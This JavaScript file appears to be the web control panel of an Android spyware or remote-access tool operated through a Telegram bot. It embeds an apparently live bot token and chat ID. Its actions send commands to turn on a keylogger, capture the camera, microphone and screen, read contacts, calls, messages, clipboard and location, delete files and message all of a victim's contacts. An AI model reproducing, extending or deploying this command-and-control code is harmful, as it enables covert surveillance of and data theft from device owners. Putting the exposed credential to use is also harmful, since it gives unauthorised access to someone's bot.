const TELEGRAM_TOKEN = '7566062834:AAHGzHVkYNyGbjHKMBbmJ3gtXT64Fkgv_Dw';
const CHAT_ID = '5951232585';

// Function to send messages to Telegram Bot
function sendTelegramMessage(message) {
    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
        }),
    })
        .then((response) => response.json())
        .then((data) => {
            if (data.ok) {
                alert('Action triggered successfully!');
            } else {
                alert('Failed to trigger action.');
            }
        })
        .catch((error) => {
            console.error('Error:', error);
            alert('Error occurred while sending message.');
        });
}

// Function to handle the action based on button click
function sendAction(action) {
    const actions = {
        apps: 'You triggered Apps!',
        device_info: 'You triggered Device Info!',
        file: 'You triggered Get File!',
        delete_file: 'You triggered Delete File!',
        clipboard: 'You triggered Clipboard!',
        microphone: 'You triggered Microphone!',
        camera_main: 'You triggered Main Camera!',
        camera_selfie: 'You triggered Selfie Camera!',
        rec_camera_main: 'You triggered Record Main Camera!',
        rec_camera_selfie: 'You triggered Record Selfie Camera!',
        location: 'You triggered Location!',
        toast: 'You triggered Toast!',
        calls: 'You triggered Calls!',
        contacts: 'You triggered Contacts!',
        vibrate: 'You triggered Vibrate!',
        show_notification: 'You triggered Show Notification!',
        messages: 'You triggered Messages!',
        send_message: 'You triggered Send Message!',
        play_audio: 'You triggered Play Audio!',
        stop_audio: 'You triggered Stop Audio!',
        screenshot: 'You triggered Screenshot!',
        torch_on: 'You triggered Torch On!',
        torch_off: 'You triggered Torch Off!',
        keylogger_on: 'You triggered Keylogger On!',
        keylogger_off: 'You triggered Keylogger Off!',
        open_target_link: 'You triggered Open Target Link!',
        text_to_speech: 'You triggered Text to Speech!',
        send_message_to_all: 'You triggered Send Message to All Contacts!',
        device_button: 'You triggered Device Buttons!',
        storage_permission: 'You triggered Grant Storage Permission!',
    };

    if (actions[action]) {
        sendTelegramMessage(actions[action]);
    } else {
        sendTelegramMessage('Invalid action: ' + action);
    }
}
